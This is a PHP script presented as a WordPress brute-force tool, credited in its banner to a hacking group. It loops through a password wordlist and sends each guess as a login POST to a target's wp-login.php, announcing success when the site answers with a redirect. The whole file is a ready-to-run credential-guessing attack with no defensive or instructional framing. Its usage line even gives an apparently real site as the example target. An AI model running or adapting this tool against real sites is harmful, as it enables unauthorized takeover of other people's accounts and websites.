<?php
#coded by 4LM05TH3V!L
#MADE WITH <3
error_reporting(0);
system('clear') or system('cls');
echo 
"\033[32m
   .       . 
+  :      .
          :       _
      .   !   '  (_)      
         ,|.'               
-  -- ---(-O-`--- --  -   { Wordpress Brute Force }
        ,`|'`.              Coded By 4LMO5TH3V!L
      ,   !    .      [?] IndoSec - Hidden Ghost Team [?]
          :       :   
          .     --+--
.:        .       !
\n\033[31m[!] \033[0mUsage: php brute.php http://tusbol.com/wp-login.php username wordlist.txt \n";
$useragent = "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0";
$url = $argv[1];
$user = $argv[2];
$listget = $argv[3];
if ($url == null || $user == null || $listget == null) {
	exit("\n\033[31m[!] \033[0mUsage: php brute.php http://tusbol.com/wp-login.php username wordlist.txt \n\n");
}
$list_get = file_get_contents($listget);
$list = array_filter(explode("\n", $list_get));
$loaded = count($list);
$current = 1;
foreach($list as $lists){
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            curl_setopt($ch, CURLOPT_POST, true);
            curl_setopt($ch, CURLOPT_POSTFIELDS, "log=$user&pwd=$lists&wp-submit=Login&redirect_to=$url/wp-admin/");
            $exec = curl_exec($ch);
            $http = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($http == 302){
    echo "\n\033[32m[!] \033[0mFound!  ~> ".$url." ~ ".$user." | ".$lists."\n";
    break;
} else {
    echo "\n\033[31m[!] \033[0mFailed! ~> ".$url." ~ ".$user." | ".$lists."";
   }
}
echo "\n";
?>
